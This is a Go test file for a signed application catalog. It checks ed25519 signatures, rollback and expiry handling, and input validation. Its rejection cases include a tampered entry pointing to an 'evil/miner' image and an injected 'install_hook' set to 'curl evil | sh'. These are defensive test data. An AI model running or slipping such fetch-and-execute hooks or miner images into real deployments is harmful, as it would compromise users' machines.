package catalog

import (
	"crypto/ed25519"
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"errors"
	"strings"
	"testing"
	"time"
)

var now = time.Date(2026, 10, 27, 12, 0, 0, 0, time.UTC)

const whoami = `services:
  app:
    image: traefik/whoami:v1.10
    user: "65534"
    command: ["--port", "8080", "--name", "${GREETING}"]
    ports: ["${PORT}:8080"]
    environment:
      TOKEN: ${TOKEN}
`

func sample() Catalog {
	min, max := int64(1024), int64(65535)
	return Catalog{Name: "Test catalog", Serial: 3, Expires: now.Add(30 * 24 * time.Hour), Apps: []App{{
		ID: "whoami", Name: "Whoami", Version: "1.10.1", Summary: "Shows request details", Categories: []string{"Tools"},
		Homepage: "https://github.com/traefik/whoami", Compose: whoami,
		Fields: []Field{
			{Name: "PORT", Label: "Port", Type: TypeNumber, Default: "8080", Min: &min, Max: &max, Required: true},
			{Name: "GREETING", Label: "Name", Type: TypeText, Default: "kernhaven"},
			{Name: "TOKEN", Label: "Token", Type: TypePassword, Generate: GenerateHex32},
		},
		Web: &Web{Service: "app", Port: 8080},
	}}}
}

func keys(t *testing.T) (ed25519.PublicKey, ed25519.PrivateKey) {
	t.Helper()
	pub, priv, err := ed25519.GenerateKey(rand.Reader)
	if err != nil {
		t.Fatal(err)
	}
	return pub, priv
}

func sign(t *testing.T, priv ed25519.PrivateKey, c Catalog) []byte {
	t.Helper()
	b, err := Sign(priv, c)
	if err != nil {
		t.Fatal(err)
	}
	return b
}

func TestOpenValid(t *testing.T) {
	pub, priv := keys(t)
	v, err := Open(sign(t, priv, sample()), pub, State{}, now)
	if err != nil {
		t.Fatal(err)
	}
	if v.Catalog.Serial != 3 || len(v.Catalog.Apps) != 1 || len(v.PayloadSHA256) != 64 {
		t.Fatalf("unexpected result %+v", v)
	}
	// Re-syncing the identical catalog is fine.
	if _, err := Open(sign(t, priv, sample()), pub, State{Serial: 3, PayloadSHA256: v.PayloadSHA256}, now); err != nil {
		t.Fatalf("same catalog again: %v", err)
	}
}

func envelope(t *testing.T, b []byte) Envelope {
	t.Helper()
	var e Envelope
	if err := json.Unmarshal(b, &e); err != nil {
		t.Fatal(err)
	}
	return e
}

func marshal(t *testing.T, v any) []byte {
	t.Helper()
	b, err := json.Marshal(v)
	if err != nil {
		t.Fatal(err)
	}
	return b
}

func TestOpenRejects(t *testing.T) {
	pub, priv := keys(t)
	otherPub, otherPriv := keys(t)
	good := sign(t, priv, sample())
	accepted, err := Open(good, pub, State{}, now)
	if err != nil {
		t.Fatal(err)
	}

	tamperedPayload := envelope(t, good)
	raw, _ := base64.StdEncoding.DecodeString(tamperedPayload.Payload)
	raw = []byte(strings.Replace(string(raw), "traefik/whoami:v1.10", "evil/miner:latest", 1))
	tamperedPayload.Payload = base64.StdEncoding.EncodeToString(raw)

	tamperedSig := envelope(t, good)
	sig, _ := base64.StdEncoding.DecodeString(tamperedSig.Signature)
	sig[0] ^= 1
	tamperedSig.Signature = base64.StdEncoding.EncodeToString(sig)

	unsigned := envelope(t, good)
	unsigned.Signature = ""

	older := sample()
	older.Serial = 2
	sameSerial := sample()
	sameSerial.Apps[0].Version = "1.10.2"
	expired := sample()
	expired.Expires = now.Add(-time.Minute)
	far := sample()
	far.Expires = now.Add(500 * 24 * time.Hour)

	var unknown map[string]any
	_ = json.Unmarshal(marshal(t, sample()), &unknown)
	unknown["install_hook"] = "curl evil | sh"
	unknownPayload, _ := json.Marshal(unknown)
	unknownEnv := Envelope{Format: Format, Payload: base64.StdEncoding.EncodeToString(unknownPayload),
		Signature: base64.StdEncoding.EncodeToString(ed25519.Sign(priv, signedMessage(unknownPayload)))}

	cases := []struct {
		name  string
		data  []byte
		key   ed25519.PublicKey
		state State
		want  error
	}{
		{"not json", []byte("services: {}"), pub, State{}, ErrFormat},
		{"wrong format", marshal(t, Envelope{Format: "other/v1"}), pub, State{}, ErrFormat},
		{"unsigned", marshal(t, unsigned), pub, State{}, ErrSignature},
		{"tampered payload", marshal(t, tamperedPayload), pub, State{}, ErrSignature},
		{"tampered signature", marshal(t, tamperedSig), pub, State{}, ErrSignature},
		{"other key", sign(t, otherPriv, sample()), pub, State{}, ErrSignature},
		{"wrong trust key", good, otherPub, State{}, ErrSignature},
		{"rollback", sign(t, priv, older), pub, State{Serial: 3}, ErrRollback},
		{"same serial, other content", sign(t, priv, sameSerial), pub, State{Serial: 3, PayloadSHA256: accepted.PayloadSHA256}, ErrRollback},
		{"expired", sign(t, priv, expired), pub, State{}, ErrExpired},
		{"too far ahead", sign(t, priv, far), pub, State{}, ErrInvalid},
		{"unknown field", marshal(t, unknownEnv), pub, State{}, ErrInvalid},
		{"too large", append(good, make([]byte, MaxEnvelope)...), pub, State{}, ErrFormat},
	}
	for _, c := range cases {
		_, err := Open(c.data, c.key, c.state, now)
		if !errors.Is(err, c.want) {
			t.Errorf("%s: got %v, want %v", c.name, err, c.want)
		}
	}
}

func TestInvalidApps(t *testing.T) {
	_, priv := keys(t)
	cases := map[string]func(a *App){
		"bad id":             func(a *App) { a.ID = "Who Am I" },
		"no version":         func(a *App) { a.Version = "" },
		"control characters": func(a *App) { a.Summary = "a\x1b[31mred" },
		"http homepage":      func(a *App) { a.Homepage = "http://example.com" },
		"bad category":       func(a *App) { a.Categories = []string{"<script>"} },
		"compose error":      func(a *App) { a.Compose = "services:\n  app:\n    build: .\n" },
		"unknown variable":   func(a *App) { a.Compose = strings.Replace(whoami, "${TOKEN}", "${MISSING}", 1) },
		"field name":         func(a *App) { a.Fields[1].Name = "lower" },
		"field type":         func(a *App) { a.Fields[1].Type = "file" },
		"bad default":        func(a *App) { a.Fields[0].Default = "80" },
		"password default":   func(a *App) { a.Fields[2].Default = "hunter2hunter2" },
		"generate number":    func(a *App) { a.Fields[0].Generate = GenerateHex32 },
		"duplicate field":    func(a *App) { a.Fields[1].Name = "PORT" },
		"web service":        func(a *App) { a.Web = &Web{Service: "db", Port: 80} },
		"exception rule": func(a *App) {
			a.Exceptions = []Exception{{Service: "app", Rule: "docker-socket", Reason: "needs the docker socket"}}
		},
		"exception reason": func(a *App) { a.Exceptions = []Exception{{Service: "app", Rule: "capability", Reason: "x"}} },
		"policy-invalid spec": func(a *App) {
			a.Compose = "services:\n  app:\n    image: \"../etc\"\n"
		},
	}
	for name, mutate := range cases {
		c := sample()
		mutate(&c.Apps[0])
		if _, err := Sign(priv, c); !errors.Is(err, ErrInvalid) {
			t.Errorf("%s: got %v, want ErrInvalid", name, err)
		}
	}
	dup := sample()
	dup.Apps = append(dup.Apps, dup.Apps[0])
	if _, err := Sign(priv, dup); err == nil || !strings.Contains(err.Error(), "duplicate id") {
		t.Errorf("duplicate app: %v", err)
	}
}

func TestFieldCheck(t *testing.T) {
	min, max := int64(1), int64(10)
	cases := []struct {
		f    Field
		v    string
		good bool
	}{
		{Field{Type: TypeNumber, Min: &min, Max: &max}, "5", true},
		{Field{Type: TypeNumber, Min: &min, Max: &max}, "11", false},
		{Field{Type: TypeNumber}, "1e3", false},
		{Field{Type: TypeBoolean}, "yes", false},
		{Field{Type: TypeSelect, Options: []string{"a", "b"}}, "b", true},
		{Field{Type: TypeSelect, Options: []string{"a", "b"}}, "c", false},
		{Field{Type: TypePassword}, "short", false},
		{Field{Type: TypePassword}, "long enough", true},
		{Field{Type: TypeText}, "two\nlines", false},
		{Field{Type: TypeText}, strings.Repeat("x", MaxValue+1), false},
	}
	for _, c := range cases {
		if err := c.f.Check(c.v); (err == nil) != c.good {
			t.Errorf("%s %q: err=%v", c.f.Type, c.v, err)
		}
	}
}

func TestParsePublicKey(t *testing.T) {
	pub, _ := keys(t)
	got, err := ParsePublicKey(base64.StdEncoding.EncodeToString(pub))
	if err != nil || !got.Equal(pub) {
		t.Fatalf("round trip: %v", err)
	}
	for _, bad := range []string{"", "not base64!", base64.StdEncoding.EncodeToString([]byte("short"))} {
		if _, err := ParsePublicKey(bad); err == nil {
			t.Errorf("%q accepted", bad)
		}
	}
}

func FuzzOpen(f *testing.F) {
	pub, priv, _ := ed25519.GenerateKey(rand.Reader)
	good, _ := Sign(priv, sample())
	f.Add(good)
	f.Add([]byte(`{"format":"kernhaven-catalog/v1","payload":"e30=","signature":""}`))
	f.Fuzz(func(t *testing.T, data []byte) {
		v, err := Open(data, pub, State{}, now)
		if err == nil && len(v.Catalog.Apps) > MaxApps {
			t.Fatal("limit not enforced")
		}
	})
}
